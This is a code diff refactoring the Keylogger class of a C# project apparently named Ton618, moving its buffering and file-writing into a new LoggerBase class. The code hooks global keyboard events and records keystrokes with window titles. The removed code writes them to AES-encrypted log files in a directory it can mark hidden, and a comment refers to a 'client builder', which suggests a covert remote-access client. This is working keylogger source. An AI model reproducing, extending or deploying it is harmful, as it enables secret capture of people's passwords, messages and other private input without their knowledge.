@@ -12,6 +12,7 @@ using Ton618.Config;
 using Ton618.Extensions;
 using Ton618.Helper;
 using Ton618.MouseKeyHook;
+using Ton618.Utilities;
 using Timer = System.Timers.Timer;
 
 namespace Ton618.Logging
@@ -20,23 +21,8 @@ namespace Ton618.Logging
     /// This class provides keylogging functionality and modifies/highlights the output for
     /// better user experience.
     /// </summary>
-    public class Keylogger : IDisposable
+    public class Keylogger : LoggerBase
     {
-        /// <summary>
-        /// <c>True</c> if the class has already been disposed, else <c>false</c>.
-        /// </summary>
-        public bool IsDisposed { get; private set; }
-
-        /// <summary>
-        /// The timer used to periodically flush the <see cref="logBuffer"/> from memory to disk.
-        /// </summary>
-        private readonly Timer flushTimer;
-
-        /// <summary>
-        /// The buffer used to store the logged keys in memory.
-        /// </summary>
-        private readonly StringBuilder logBuffer = new StringBuilder();
-
         /// <summary>
         /// Temporary list of pressed keys while they are being processed.
         /// </summary>
@@ -63,81 +49,31 @@ namespace Ton618.Logging
         private readonly IKeyboardMouseEvents globalEvents;
 
         /// <summary>
-        /// Provides encryption and decryption methods to securely store log files.
-        /// </summary>
-        private readonly Aes256 aes = new Aes256(Settings.ENCRYPTIONKEY);
-
-        /// <summary>
-        /// The maximum size of a single log file.
-        /// </summary>
-        private readonly long maxLogFileSize;
-
-        /// <summary>
         /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
         /// </summary>
         /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
         /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
-        public Keylogger(double flushInterval, long maxLogFileSize)
+        public Keylogger(double flushInterval, long maxLogFileSize) : base("Keyboard", flushInterval, maxLogFileSize)
         {
-            this.maxLogFileSize = maxLogFileSize;
             globalEvents = Hook.GlobalEvents();
-            flushTimer = new Timer { Interval = flushInterval };
-            flushTimer.Elapsed += TimerElapsed;
         }
 
         /// <summary>
         /// Begins logging of keys.
         /// </summary>
-        public void Start()
-        {
-            Subscribe();
-            flushTimer.Start();
-        }
-
-        /// <summary>
-        /// Disposes used resources by this class.
-        /// </summary>
-        public void Dispose()
-        {
-            Dispose(true);
-            GC.SuppressFinalize(this);
-        }
-
-        protected virtual void Dispose(bool disposing)
-        {
-            if (IsDisposed)
-                return;
-
-            if (disposing)
-            {
-                Unsubscribe();
-                flushTimer.Stop();
-                flushTimer.Dispose();
-                globalEvents.Dispose();
-                WriteFile();
-            }
-
-            IsDisposed = true;
-        }
-
-        /// <summary>
-        /// Subscribes to all key events.
-        /// </summary>
-        private void Subscribe()
+        protected override void OnStart()
         {
             globalEvents.KeyDown += OnKeyDown;
             globalEvents.KeyUp += OnKeyUp;
             globalEvents.KeyPress += OnKeyPress;
         }
 
-        /// <summary>
-        /// Unsubscribes from all key events.
-        /// </summary>
-        private void Unsubscribe()
+        protected override void OnDispose()
         {
             globalEvents.KeyDown -= OnKeyDown;
             globalEvents.KeyUp -= OnKeyUp;
             globalEvents.KeyPress -= OnKeyPress;
+            globalEvents.Dispose();
         }
 
         /// <summary>
@@ -152,7 +88,7 @@ namespace Ton618.Logging
             if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != lastWindowTitle)
             {
                 lastWindowTitle = activeWindowTitle;
-                logBuffer
+                LogBuffer
                     .Append(@"<p class=""h""><br><br>[<b>")
                     .Append(HttpUtility.HtmlEncode(activeWindowTitle))
                     .Append(" - Local=")
@@ -205,7 +141,7 @@ namespace Ton618.Logging
                         ignoreSpecialKeys = true;
 
                     pressedKeyChars.Add(e.KeyChar);
-                    logBuffer.Append(filtered);
+                    LogBuffer.Append(filtered);
                 }
             }
         }
@@ -218,7 +154,7 @@ namespace Ton618.Logging
         /// <remarks>This event handler is called third.</remarks>
         private void OnKeyUp(object sender, KeyEventArgs e)
         {
-            logBuffer.Append(HighlightSpecialKeys(pressedKeys.ToArray()));
+            LogBuffer.Append(HighlightSpecialKeys(pressedKeys.ToArray()));
             pressedKeyChars.Clear();
         }
 
@@ -309,79 +245,6 @@ namespace Ton618.Logging
             return normalKeys.ToString();
         }
 
-        private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
-        {
-            if (logBuffer.Length > 0)
-                WriteFile();
-        }
-
-        /// <summary>
-        /// Writes the logged keys from memory to disk.
-        /// </summary>
-        private void WriteFile()
-        {
-            // TODO: Add some house-keeping and delete old log entries
-            var writeHeader = false;
-
-            var fileName = Settings.GetKeyLogFileNameFormat(0);
-            var filePath = Path.Combine(Settings.LOGSPATH, fileName);
-            //var filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
-
-            try
-            {
-                var di = new DirectoryInfo(Settings.LOGSPATH);
-
-                if (!di.Exists)
-                    di.Create();
-
-                if (Settings.HIDELOGDIRECTORY)
-                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-
-                var i = 1;
-                var prevName = filePath;
-                while (File.Exists(filePath))
-                {
-                    // Large log files take a very long time to read, decrypt and append new logs to,
-                    // so create a new log file if the size of the previous one exceeds _maxLogFileSize.
-                    var length = new FileInfo(filePath).Length;
-                    if (length < maxLogFileSize)
-                        break;
-
-                    // append a number to the file name
-                    //var newFileName = $"{Path.GetFileName(filePath)}_{i}";
-                    //filePath = Path.Combine(Settings.LOGSPATH, newFileName);
-                    fileName = Settings.GetKeyLogFileNameFormat(i);
-                    filePath = Path.Combine(Settings.LOGSPATH, fileName);
-                    if (prevName.Equals(filePath, StringComparison.OrdinalIgnoreCase)) // Prevent infinite loop if the client builder omitted file index template
-                        filePath = Path.Combine(Settings.LOGSPATH, $"{Path.GetFileName(filePath)}_{i}");
-                    i++;
-                }
-
-                if (!File.Exists(filePath))
-                    writeHeader = true;
-
-                var logFile = new StringBuilder();
-
-                if (writeHeader)
-                {
-                    logFile.Append("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Input log created on ").Append(DateTime.Now.ToString("f", DateTimeFormatInfo.InvariantInfo)).Append(" Local, ").Append(DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo)).Append(" UTC<br><br>");
-                    logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");
-
-                    lastWindowTitle = string.Empty;
-                }
-
-                if (logBuffer.Length > 0)
-                    logFile.Append(logBuffer);
-
-                FileHelper.WriteLogFile(filePath, logFile.ToString(), aes);
-
-                logFile.Clear();
-            }
-            catch
-            {
-            }
-
-            logBuffer.Clear();
-        }
+        protected override string LogFileNameSupplier(int fileIndex) => Settings.GetKeyLogFileNameFormat(fileIndex);
     }
 }
